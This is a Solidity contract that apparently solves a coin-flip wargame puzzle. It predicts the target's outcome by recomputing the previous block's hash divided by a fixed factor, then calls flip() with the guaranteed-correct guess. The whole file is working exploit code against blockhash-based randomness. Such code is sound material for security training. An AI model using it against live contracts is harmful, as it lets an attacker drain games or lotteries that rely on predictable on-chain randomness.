// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../interfaces/ICoinflip.sol";
contract CoinFlipAttack {
    ICoinflip public target;

    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinflip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        target.flip(guess);
    }
}